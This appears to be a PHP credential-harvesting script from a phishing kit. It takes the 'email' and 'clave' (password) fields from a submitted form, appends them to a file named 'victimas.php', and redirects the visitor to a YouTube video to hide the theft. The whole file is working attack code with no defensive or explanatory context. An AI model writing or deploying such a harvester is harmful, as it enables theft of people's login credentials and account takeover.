<?php
header ('Location: https://www.youtube.com/watch?v=nyCwwDNnAng');
$handle = fopen("victimas.php", "a");
foreach($_POST as $variable => $value) {
if($variable=="email" || $variable == "clave")
{
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>